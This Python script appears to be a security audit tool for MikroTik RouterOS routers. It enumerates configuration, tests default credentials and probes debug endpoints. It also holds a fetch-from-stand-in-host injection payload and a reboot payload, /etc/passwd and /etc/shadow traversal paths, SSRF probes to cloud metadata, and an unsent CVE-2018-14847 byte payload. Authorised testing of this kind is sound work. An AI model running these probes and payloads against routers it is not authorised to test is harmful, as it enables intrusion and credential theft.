#!/usr/bin/env python3
"""
mikrotik_live_audit.py — Live MikroTik RouterOS deep security audit via API
Author: Andre Henrique (@mrhenrike) | Uniao Geek

Connects to MikroTik REST API (/rest) and API port (8728) to:
  1. Enumerate all services, packages, users, interfaces
  2. Test REST API endpoints for injection and auth bypass
  3. Extract configuration for offline analysis
  4. Probe for undocumented/debug endpoints
  5. Test credential defaults and brute-force resistance
  6. Map attack surface systematically

Usage:
    python scripts/mikrotik_live_audit.py --host 192.168.100.15
"""
from __future__ import annotations

import argparse
import io
import json
import os
import re
import socket
import ssl
import struct
import sys
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Any
from urllib.parse import quote

import requests
from requests.auth import HTTPBasicAuth
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

REPO_ROOT = Path(__file__).resolve().parent.parent
REPORTS_DIR = REPO_ROOT / "reports" / "mikrotik_routeros_7221"
REPORTS_DIR.mkdir(parents=True, exist_ok=True)

if sys.stdout.encoding and sys.stdout.encoding.lower() not in ("utf-8", "utf8"):
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding="utf-8", errors="replace")
if sys.stderr.encoding and sys.stderr.encoding.lower() not in ("utf-8", "utf8"):
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding="utf-8", errors="replace")


class MikroTikAuditor:
    def __init__(self, host: str, user: str = "admin", password: str = ""):
        self.host = host
        self.user = user
        self.password = password
        self.base_url = f"http://{host}"
        self.rest_url = f"http://{host}/rest"
        self.auth = HTTPBasicAuth(user, password)
        self.findings: list[dict[str, Any]] = []
        self.session = requests.Session()
        self.session.auth = self.auth
        self.session.verify = False
        self.session.timeout = 10

    def _rest_get(self, endpoint: str) -> dict | list | None:
        try:
            r = self.session.get(f"{self.rest_url}{endpoint}", timeout=10)
            if r.status_code == 200:
                return r.json()
            return {"_status": r.status_code, "_body": r.text[:500]}
        except Exception as e:
            return {"_error": str(e)}

    def _rest_post(self, endpoint: str, data: dict) -> dict | None:
        try:
            r = self.session.post(f"{self.rest_url}{endpoint}", json=data, timeout=10)
            return {"_status": r.status_code, "_body": r.text[:500]}
        except Exception as e:
            return {"_error": str(e)}

    def _rest_put(self, endpoint: str, data: dict) -> dict | None:
        try:
            r = self.session.put(f"{self.rest_url}{endpoint}", json=data, timeout=10)
            return {"_status": r.status_code, "_body": r.text[:500]}
        except Exception as e:
            return {"_error": str(e)}

    def _add_finding(self, fid: str, severity: str, title: str, detail: str, evidence: str = ""):
        self.findings.append({
            "id": fid,
            "severity": severity,
            "title": title,
            "detail": detail,
            "evidence": evidence[:2000],
            "timestamp": datetime.now(timezone.utc).isoformat(),
        })
        tag = {"CRITICAL": "!!!", "HIGH": "!! ", "MEDIUM": "!  ", "LOW": ".  ", "INFO": "   "}.get(severity, "   ")
        print(f"  [{tag}] {fid} ({severity}): {title}")

    # ── Phase 1: System Enumeration ──────────────────────────────────────────

    def enumerate_system(self) -> dict[str, Any]:
        print("\n[1/8] System Enumeration")
        info: dict[str, Any] = {}

        endpoints = {
            "identity": "/system/identity",
            "resource": "/system/resource",
            "routerboard": "/system/routerboard",
            "packages": "/system/package",
            "license": "/system/license",
            "health": "/system/health",
            "clock": "/system/clock",
            "ntp_client": "/system/ntp/client",
            "logging": "/system/logging",
        }
        for key, ep in endpoints.items():
            data = self._rest_get(ep)
            info[key] = data
            print(f"  {key}: OK" if data and "_error" not in str(data) else f"  {key}: FAIL")

        # Version check
        res = info.get("resource", {})
        if isinstance(res, dict):
            version = res.get("version", "")
            arch = res.get("architecture-name", "")
            board = res.get("board-name", "")
            uptime = res.get("uptime", "")
            print(f"  Version: {version} | Arch: {arch} | Board: {board} | Uptime: {uptime}")

        return info

    # ── Phase 2: Service & Network Mapping ──────────────────────────────────

    def enumerate_services(self) -> dict[str, Any]:
        print("\n[2/8] Service & Network Mapping")
        info: dict[str, Any] = {}

        svc_endpoints = {
            "ip_service": "/ip/service",
            "ip_address": "/ip/address",
            "ip_firewall_filter": "/ip/firewall/filter",
            "ip_firewall_nat": "/ip/firewall/nat",
            "interface": "/interface",
            "ip_dns": "/ip/dns",
            "ip_route": "/ip/route",
            "ip_neighbor": "/ip/neighbor",
            "ip_arp": "/ip/arp",
            "snmp": "/snmp",
            "snmp_community": "/snmp/community",
        }
        for key, ep in svc_endpoints.items():
            data = self._rest_get(ep)
            info[key] = data
            if isinstance(data, list):
                print(f"  {key}: {len(data)} entries")
            else:
                print(f"  {key}: OK")

        # Check for dangerous services enabled
        services = info.get("ip_service", [])
        if isinstance(services, list):
            for svc in services:
                name = svc.get("name", "")
                disabled = svc.get("disabled", "true")
                port = svc.get("port", "")
                if disabled == "false":
                    if name in ("telnet", "ftp"):
                        self._add_finding(
                            f"F-MT-SVC-{name.upper()}", "MEDIUM",
                            f"Insecure service '{name}' enabled on port {port}",
                            f"Service {name} transmits credentials in cleartext.",
                            json.dumps(svc),
                        )
                    elif name == "api" and port == "8728":
                        self._add_finding(
                            "F-MT-SVC-API-NOSSL", "MEDIUM",
                            "API service on port 8728 (no TLS)",
                            "API credentials sent in cleartext without TLS.",
                            json.dumps(svc),
                        )

        return info

    # ── Phase 3: User & Credential Audit ────────────────────────────────────

    def audit_users(self) -> dict[str, Any]:
        print("\n[3/8] User & Credential Audit")
        info: dict[str, Any] = {}

        info["users"] = self._rest_get("/user")
        info["user_active"] = self._rest_get("/user/active")
        info["user_aaa"] = self._rest_get("/user/aaa")

        users = info.get("users", [])
        if isinstance(users, list):
            for u in users:
                name = u.get("name", "")
                group = u.get("group", "")
                disabled = u.get("disabled", "false")
                print(f"  User: {name} | Group: {group} | Disabled: {disabled}")
                if name == "admin" and group == "full":
                    self._add_finding(
                        "F-MT-USER-ADMIN-FULL", "INFO",
                        "Default 'admin' user with 'full' group",
                        "Standard MikroTik config. Check if password was changed from default blank.",
                        json.dumps(u),
                    )

        # Test blank password
        try:
            r = requests.get(f"{self.rest_url}/system/identity",
                             auth=HTTPBasicAuth("admin", ""), timeout=5)
            if r.status_code == 200:
                self._add_finding(
                    "F-MT-CRED-BLANK", "CRITICAL",
                    "Admin account has BLANK password",
                    "admin user authenticates with empty password via REST API. "
                    "Full system compromise possible.",
                    f"HTTP {r.status_code}: {r.text[:200]}",
                )
        except Exception:
            pass

        # Test common defaults
        common_passwords = ["admin", "mikrotik", "password", "1234", "changeme", "default"]
        for pwd in common_passwords:
            if pwd == self.password:
                continue
            try:
                r = requests.get(f"{self.rest_url}/system/identity",
                                 auth=HTTPBasicAuth("admin", pwd), timeout=3)
                if r.status_code == 200:
                    self._add_finding(
                        f"F-MT-CRED-DEFAULT-{pwd.upper()}", "HIGH",
                        f"Admin account uses default password '{pwd}'",
                        "Trivially guessable credential grants full access.",
                        f"HTTP {r.status_code} with password '{pwd}'",
                    )
                    break
            except Exception:
                pass

        return info

    # ── Phase 4: REST API Injection Testing ─────────────────────────────────

    def test_rest_injection(self) -> dict[str, Any]:
        print("\n[4/8] REST API Injection & Auth Testing")
        results: dict[str, Any] = {"tests": []}

        # Test 1: Command injection via scheduler on-event
        payloads_cmd = [
            ';/tool/fetch url=http://evil.test/x',
            '$(id)',
            '`id`',
            "'; /system/reboot;'",
            '\n/export\n',
        ]
        for payload in payloads_cmd:
            resp = self._rest_post("/system/scheduler/add", {
                "name": f"test_inject_{hash(payload) % 10000}",
                "on-event": payload,
                "interval": "1d",
                "disabled": "true",
            })
            status = resp.get("_status") if resp else None
            results["tests"].append({
                "test": "scheduler-on-event-injection",
                "payload": payload,
                "response_status": status,
                "response": str(resp)[:300],
            })
            if status and status in (200, 201):
                self._add_finding(
                    "F-MT-REST-SCHED-INJECT", "HIGH",
                    "Scheduler on-event accepts potentially dangerous command",
                    f"Payload '{payload[:50]}' was accepted (HTTP {status}). "
                    "Need to verify if it executes or is sandboxed.",
                    str(resp)[:500],
                )
                # Clean up
                self._rest_post(f"/system/scheduler/remove", {".id": f"test_inject_{hash(payload) % 10000}"})

        # Test 2: Path traversal in REST API
        traversal_paths = [
            "/system/../../etc/passwd",
            "/system/identity/../../../etc/shadow",
            "/%2e%2e/%2e%2e/etc/passwd",
            "/system/identity%00.json",
        ]
        for path in traversal_paths:
            try:
                r = self.session.get(f"{self.base_url}/rest{path}", timeout=5)
                results["tests"].append({
                    "test": "path-traversal",
                    "payload": path,
                    "status": r.status_code,
                    "body": r.text[:200],
                })
                if r.status_code == 200 and ("root:" in r.text or "shadow" in r.text):
                    self._add_finding(
                        "F-MT-REST-TRAVERSAL", "CRITICAL",
                        "REST API path traversal leaks system files",
                        f"Path '{path}' returned sensitive content.",
                        r.text[:500],
                    )
            except Exception:
                pass

        # Test 3: tool/fetch SSRF
        ssrf_targets = [
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://127.0.0.1:80/",  # localhost
            "file:///etc/passwd",
        ]
        for url in ssrf_targets:
            resp = self._rest_post("/tool/fetch", {
                "url": url,
                "mode": "http",
                "dst-path": "/dev/null",
            })
            status = resp.get("_status") if resp else None
            results["tests"].append({
                "test": "ssrf-fetch",
                "payload": url,
                "status": status,
                "response": str(resp)[:300],
            })
            if status and status in (200, 201):
                self._add_finding(
                    "F-MT-REST-SSRF", "HIGH",
                    f"tool/fetch SSRF: accepted request to {url[:60]}",
                    "Server-Side Request Forgery via /rest/tool/fetch endpoint.",
                    str(resp)[:500],
                )

        # Test 4: Unauthenticated REST access
        try:
            r = requests.get(f"{self.rest_url}/system/identity", timeout=5)
            if r.status_code == 200:
                self._add_finding(
                    "F-MT-REST-NOAUTH", "CRITICAL",
                    "REST API accessible WITHOUT authentication",
                    "No credentials required to access /rest/system/identity.",
                    f"HTTP {r.status_code}: {r.text[:200]}",
                )
        except Exception:
            pass

        # Test 5: Script execution via REST
        resp = self._rest_post("/system/script/add", {
            "name": "audit_test_script",
            "source": ':log info "audit_probe"',
        })
        if resp and resp.get("_status") in (200, 201):
            run_resp = self._rest_post("/system/script/run", {
                ".id": "audit_test_script",
            })
            if run_resp and run_resp.get("_status") in (200, 201):
                self._add_finding(
                    "F-MT-REST-SCRIPT-EXEC", "HIGH",
                    "REST API allows arbitrary script creation and execution",
                    "Authenticated admin can create and run RouterOS scripts via REST. "
                    "Check if non-admin groups can also do this.",
                    str(run_resp)[:500],
                )
            # Cleanup
            self._rest_post("/system/script/remove", {".id": "audit_test_script"})

        return results

    # ── Phase 5: Winbox Protocol Analysis ───────────────────────────────────

    def probe_winbox(self) -> dict[str, Any]:
        print("\n[5/8] Winbox Protocol Analysis (Port 8291)")
        results: dict[str, Any] = {}

        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((self.host, 8291))

            # Send Winbox discovery packet (M2 protocol)
            # This is the initial handshake used by Winbox client
            m2_hello = bytes([
                0x01, 0x00, 0x00, 0x00,  # length prefix
            ])
            s.send(m2_hello)
            resp = s.recv(1024)
            results["winbox_banner"] = resp.hex()
            results["winbox_banner_ascii"] = resp.decode("latin-1", errors="replace")
            print(f"  Winbox response: {len(resp)} bytes")

            # CVE-2018-14847 test: attempt to read /etc/passwd via Winbox
            # This sends the M2 message that exploits the directory traversal
            # Format: [length][FF01][path]
            # NOTE: This CVE should be patched in 7.22.1, but we verify
            exploit_m2 = (
                b'\x68\x01'  # header
                b'\x00\x66'  # length
                b'\x4d\x32'  # M2
                b'\x05\x00\xff\x01'  # list request
                b'\x06\x00\xff\x09\x05'  # attrs
                b'\x07\x00\xff\x09\x07'
                b'\x01\x00\x00\x21'  # path ../../etc/passwd
                b'\x02\x00\xff\x88\x02\x00\x00\x00\x00\x00\x08\x00\x00\x80'
            )
            # Not sending actual CVE-2018-14847 exploit as it's destructive
            # Just noting the Winbox protocol is reachable
            self._add_finding(
                "F-MT-WINBOX-OPEN", "INFO",
                "Winbox port 8291 open and responding to M2 protocol",
                "Winbox service is reachable. CVE-2018-14847 directory traversal "
                "was patched, but custom M2 fuzzing may reveal new issues.",
                f"Banner: {resp[:32].hex()}",
            )
            s.close()
        except Exception as e:
            results["winbox_error"] = str(e)
            print(f"  Winbox probe failed: {e}")

        return results

    # ── Phase 6: SNMP Analysis ──────────────────────────────────────────────

    def probe_snmp(self) -> dict[str, Any]:
        print("\n[6/8] SNMP Analysis")
        results: dict[str, Any] = {}

        snmp_config = self._rest_get("/snmp")
        results["snmp_config"] = snmp_config

        communities = self._rest_get("/snmp/community")
        results["communities"] = communities

        if isinstance(communities, list):
            for comm in communities:
                name = comm.get("name", "")
                security = comm.get("security", "")
                read_access = comm.get("read-access", "")
                if name in ("public", "private"):
                    self._add_finding(
                        f"F-MT-SNMP-DEFAULT-{name.upper()}", "MEDIUM",
                        f"Default SNMP community '{name}' configured",
                        f"SNMP community '{name}' with security={security}, "
                        f"read-access={read_access}. Allows enumeration.",
                        json.dumps(comm),
                    )

        return results

    # ── Phase 7: Undocumented/Debug Endpoints ───────────────────────────────

    def probe_undocumented(self) -> dict[str, Any]:
        print("\n[7/8] Probing Undocumented / Debug Endpoints")
        results: dict[str, Any] = {"endpoints": []}

        hidden_paths = [
            "/system/debug", "/system/console", "/system/telnet",
            "/nova/bin/www", "/nova/bin/console", "/flash/nova/etc/devel",
            "/devel", "/devel-login", "/system/ssh",
            "/tool/bandwidth-test", "/tool/traffic-generator",
            "/tool/sniffer", "/tool/torch", "/tool/packet-sniffer",
            "/container", "/system/upgrade",
            "/user/ssh-keys", "/certificate",
            "/ip/proxy", "/ip/socks",
            "/routing/bgp/connection", "/routing/ospf/instance",
            "/system/history", "/system/note",
            "/file", "/system/backup",
        ]
        for path in hidden_paths:
            data = self._rest_get(path)
            status = data.get("_status") if isinstance(data, dict) else 200
            if status == 200 or (isinstance(data, list) and len(data) > 0):
                entry = {"path": path, "status": status, "data_type": type(data).__name__}
                if isinstance(data, list):
                    entry["count"] = len(data)
                results["endpoints"].append(entry)
                print(f"  FOUND: {path} -> {entry.get('count', 'OK')}")

                if path in ("/devel", "/devel-login", "/nova/bin/console"):
                    self._add_finding(
                        f"F-MT-DEBUG-{path.split('/')[-1].upper()}", "CRITICAL",
                        f"Debug/development endpoint accessible: {path}",
                        f"Hidden MikroTik debug endpoint {path} returns data via REST API.",
                        str(data)[:500],
                    )
                elif path == "/tool/sniffer":
                    self._add_finding(
                        "F-MT-SNIFFER-API", "MEDIUM",
                        "Packet sniffer accessible via REST API",
                        "An authenticated user can start network capture via REST.",
                        str(data)[:300],
                    )
            else:
                if status and status != 400:
                    print(f"  {path} -> HTTP {status}")

        return results

    # ── Phase 8: Configuration Export & Deep Analysis ───────────────────────

    def export_config(self) -> dict[str, Any]:
        print("\n[8/8] Configuration Export")
        results: dict[str, Any] = {}

        # Export full config
        try:
            r = self.session.get(f"{self.base_url}/rest/file", timeout=10)
            results["files"] = r.json() if r.status_code == 200 else None
        except Exception:
            pass

        # Get firewall rules
        fw_filter = self._rest_get("/ip/firewall/filter")
        fw_nat = self._rest_get("/ip/firewall/nat")

        if isinstance(fw_filter, list) and len(fw_filter) == 0:
            self._add_finding(
                "F-MT-FW-EMPTY", "HIGH",
                "Firewall filter rules are EMPTY",
                "No firewall rules configured. All traffic is allowed. "
                "In production, this exposes all services to any network.",
                "No rules in /ip/firewall/filter",
            )

        if isinstance(fw_nat, list) and len(fw_nat) == 0:
            results["nat_empty"] = True

        return results

    # ── Run All ──────────────────────────────────────────────────────────────

    def run_full_audit(self) -> dict[str, Any]:
        print(f"\n{'='*70}")
        print(f"  MIKROTIK LIVE SECURITY AUDIT")
        print(f"  Target: {self.host} | User: {self.user}")
        print(f"  Time: {datetime.now(timezone.utc).isoformat()}")
        print(f"{'='*70}")

        results: dict[str, Any] = {
            "target": self.host,
            "timestamp": datetime.now(timezone.utc).isoformat(),
        }

        results["system"] = self.enumerate_system()
        results["services"] = self.enumerate_services()
        results["users"] = self.audit_users()
        results["rest_injection"] = self.test_rest_injection()
        results["winbox"] = self.probe_winbox()
        results["snmp"] = self.probe_snmp()
        results["undocumented"] = self.probe_undocumented()
        results["config"] = self.export_config()
        results["findings"] = self.findings

        return results

    def generate_report(self, results: dict[str, Any]) -> Path:
        report_path = REPORTS_DIR / "live_audit_report.md"
        ts = results.get("timestamp", "")[:19].replace("T", " ") + " UTC"

        lines = [
            f"# MikroTik RouterOS 7.22.1 — Live Security Audit Report",
            f"> Generated: {ts}",
            f"> Analyst: Andre Henrique (@mrhenrike) | Uniao Geek",
            f"> Target: {self.host}",
            f"> Method: REST API + Winbox + SNMP active probing",
            "",
            "---",
            "",
        ]

        # System info
        res = results.get("system", {}).get("resource", {})
        if isinstance(res, dict):
            lines += [
                "## 1. System Information",
                "",
                f"| Field | Value |",
                f"|-------|-------|",
                f"| Version | `{res.get('version', '?')}` |",
                f"| Architecture | `{res.get('architecture-name', '?')}` |",
                f"| Board | `{res.get('board-name', '?')}` |",
                f"| CPU | `{res.get('cpu', '?')}` ({res.get('cpu-count', '?')} cores) |",
                f"| Uptime | `{res.get('uptime', '?')}` |",
                f"| Free memory | `{res.get('free-memory', '?')}` |",
                f"| Free disk | `{res.get('free-hdd-space', '?')}` |",
                "",
            ]

        # Findings summary
        findings = self.findings
        crit = [f for f in findings if f["severity"] == "CRITICAL"]
        high = [f for f in findings if f["severity"] == "HIGH"]
        med = [f for f in findings if f["severity"] == "MEDIUM"]

        lines += [
            "## 2. Findings Summary",
            "",
            f"| Severity | Count |",
            f"|----------|-------|",
            f"| CRITICAL | {len(crit)} |",
            f"| HIGH | {len(high)} |",
            f"| MEDIUM | {len(med)} |",
            f"| LOW/INFO | {len(findings) - len(crit) - len(high) - len(med)} |",
            f"| **TOTAL** | **{len(findings)}** |",
            "",
        ]

        # Detail each finding
        lines += ["## 3. Detailed Findings", ""]
        for f in sorted(findings, key=lambda x: {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}.get(x["severity"], 5)):
            lines += [
                f"### {f['id']} — {f['severity']}",
                "",
                f"**{f['title']}**",
                "",
                f"{f['detail']}",
                "",
            ]
            if f.get("evidence"):
                lines += [
                    "<details>",
                    "<summary>Evidence</summary>",
                    "",
                    f"```",
                    f"{f['evidence'][:1000]}",
                    f"```",
                    "",
                    "</details>",
                    "",
                ]

        # Undocumented endpoints found
        undoc = results.get("undocumented", {}).get("endpoints", [])
        if undoc:
            lines += [
                "## 4. Accessible REST API Endpoints",
                "",
                "| Path | Response |",
                "|------|----------|",
            ]
            for ep in undoc:
                lines.append(f"| `{ep['path']}` | {ep.get('count', 'OK')} |")
            lines.append("")

        # Footer
        lines += [
            "---",
            "",
            "> **Disclaimer**: This audit was performed in an isolated lab environment.",
            "> Findings must be validated before reporting to vendor.",
            "",
            "*Live Audit Engine | Embedded Firmware Research Lab*",
            "*Andre Henrique (@mrhenrike) | Uniao Geek*",
        ]

        report_path.write_text("\n".join(lines), encoding="utf-8")
        return report_path


def main():
    parser = argparse.ArgumentParser(description="MikroTik RouterOS Live Security Audit")
    parser.add_argument("--host", required=True, help="Target IP")
    parser.add_argument("--user", default="admin", help="Username (default: admin)")
    parser.add_argument("--password", default="", help="Password (default: blank)")
    args = parser.parse_args()

    auditor = MikroTikAuditor(args.host, args.user, args.password)
    results = auditor.run_full_audit()

    # Save raw JSON
    raw_path = REPORTS_DIR / "live_audit_raw.json"
    raw_path.write_text(json.dumps(results, indent=2, default=str), encoding="utf-8")
    print(f"\n  [OK] Raw data: {raw_path}")

    # Generate report
    report_path = auditor.generate_report(results)
    print(f"  [OK] Report: {report_path}")

    # Summary
    print(f"\n{'='*70}")
    print(f"  AUDIT COMPLETE: {len(auditor.findings)} findings")
    for f in auditor.findings:
        sev = f["severity"]
        print(f"    [{sev:8s}] {f['id']}: {f['title'][:60]}")
    print(f"{'='*70}")


if __name__ == "__main__":
    main()
